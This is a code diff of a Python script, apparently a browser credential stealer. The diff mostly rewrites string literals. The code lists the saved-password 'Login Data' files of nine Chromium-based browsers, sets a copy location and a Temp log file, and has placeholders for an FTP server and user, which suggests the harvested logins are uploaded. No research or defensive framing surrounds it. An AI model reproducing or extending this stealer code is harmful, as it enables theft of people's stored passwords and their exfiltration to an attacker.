@@ -12,21 +12,21 @@ reload(sys)
 sys.setdefaultencoding('utf-8')
 
 def main():	
-	pathusr         = expanduser('~')
-	vivaldi         = pathusr + '''\AppData\Local\Vivaldi\User Data\Default\Login Data'''
-	chrome          = pathusr + '''\AppData\Local\Google\Chrome\User Data\Default\Login Data'''
-	yandex          = pathusr + '''\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data'''
-	opera           = pathusr + '''\AppData\Roaming\Opera Software\Opera Stable\Login Data'''
-	kometa          = pathusr + '''\AppData\Local\Kometa\User Data\Default\Login Data'''
-	orbitum         = pathusr + '''\AppData\Local\Orbitum\User Data\Default\Login Data'''
-	comodo          = pathusr + '''\AppData\Local\Comodo\Dragon\User Data\Default\Login Data'''
-	amigo           = pathusr + '''\AppData\Local\Amigo\User\User Data\Default\Login Data'''
-	torch           = pathusr + '''\AppData\Local\Torch\User Data\Default\Login Data'''
+        pathusr = expanduser('~')
+        vivaldi = pathusr + '\\AppData\\Local\\Vivaldi\\User Data\\Default\\Login Data'
+        chrome = pathusr + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
+        yandex = pathusr + '\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data'
+        opera = pathusr + '\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data'
+        kometa  = pathusr + '\\AppData\\Local\\Kometa\\User Data\\Default\\Login Data'
+        orbitum = pathusr + '\\AppData\\Local\\Orbitum\\User Data\\Default\\Login Data'
+        comodo = pathusr + '\\AppData\\Local\\Comodo\\Dragon\\User Data\\Default\\Login Data'
+        amigo = pathusr + '\\AppData\\Local\\Amigo\\User\\User Data\\Default\\Login Data'
+        torch = pathusr + '\\AppData\\Local\\Torch\\User Data\\Default\\Login Data'
 
-	databases       = [vivaldi, chrome, yandex, opera, kometa, orbitum, comodo, amigo, torch]
+        databases = [vivaldi, chrome, yandex, opera, kometa, orbitum, comodo, amigo, torch]
 
-	coped_db        = pathusr + '''\AppData\Logins'''
-	file_with_logs  = pathusr + '''\AppData\Local\Temp\Logins.txt'''
+        coped_db = pathusr + '\\AppData\\Logins'
+        file_with_logs = pathusr + '\\AppData\\Local\\Temp\\Logins.txt'
 
 	server          = 'FTPSERVER'
 	user            = 'FTPUSER'
